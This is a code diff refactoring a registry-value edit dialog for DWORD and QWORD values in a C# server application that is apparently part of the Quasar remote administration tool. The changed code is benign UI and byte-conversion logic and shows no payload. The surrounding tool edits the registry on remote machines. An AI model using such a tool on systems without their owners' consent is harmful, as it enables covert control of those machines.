@@ -1,37 +1,21 @@
 ﻿using Microsoft.Win32;
+using Quasar.Common.Models;
+using Quasar.Common.Utilities;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
 using System.Windows.Forms;
-using xServer.Core.Networking;
-using xServer.Core.Registry;
 using xServer.Enums;
 
 namespace xServer.Forms
 {
     public partial class FrmRegValueEditWord : Form
     {
-        private readonly Client _connectClient;
-
         private readonly RegValueData _value;
-
-        private readonly string _keyPath;
-
-        #region CONSTANT
 
         private const string DWORD_WARNING = "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?";
         private const string QWORD_WARNING = "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?";
 
-        #endregion
-
-        public FrmRegValueEditWord(string keyPath, RegValueData value, Client c)
+        public FrmRegValueEditWord(RegValueData value)
         {
-            _connectClient = c;
-            _keyPath = keyPath;
             _value = value;
 
             InitializeComponent();
@@ -42,13 +26,13 @@ namespace xServer.Forms
             {
                 this.Text = "Edit DWORD (32-bit) Value";
                 this.valueDataTxtBox.Type = WordType.DWORD;
-                this.valueDataTxtBox.Text = ((uint)(int)value.Data).ToString("x");
+                this.valueDataTxtBox.Text = ByteConverter.ToUInt32(value.Data).ToString("x");
             }
             else 
             {
                 this.Text = "Edit QWORD (64-bit) Value";
                 this.valueDataTxtBox.Type = WordType.QWORD;
-                this.valueDataTxtBox.Text = ((ulong)(long)value.Data).ToString("x");
+                this.valueDataTxtBox.Text = ByteConverter.ToUInt64(value.Data).ToString("x");
             }
         }
 
@@ -65,21 +49,20 @@ namespace xServer.Forms
 
         private void okButton_Click(object sender, EventArgs e)
         {
-            if(valueDataTxtBox.IsConversionValid() || IsOverridePossible())
+            if (valueDataTxtBox.IsConversionValid() || IsOverridePossible())
             {
-                object valueData = null;
-                if(_value.Kind == RegistryValueKind.DWord)
-                    valueData = (int)valueDataTxtBox.UIntValue;
-                else
-                    valueData = (long)valueDataTxtBox.ULongValue;
-
-                new xServer.Core.Packets.ServerPackets.DoChangeRegistryValue(_keyPath, new RegValueData(_value.Name, _value.Kind, valueData)).Execute(_connectClient);
+                _value.Data = _value.Kind == RegistryValueKind.DWord
+                    ? ByteConverter.GetBytes(valueDataTxtBox.UIntValue)
+                    : ByteConverter.GetBytes(valueDataTxtBox.ULongValue);
+                this.Tag = _value;
+                this.DialogResult = DialogResult.OK;
             }
             else
             {
-                //Prevent exit
-                DialogResult = DialogResult.None;
+                this.DialogResult = DialogResult.None;
             }
+
+            this.Close();
         }
 
         private DialogResult ShowWarning(string msg, string caption)
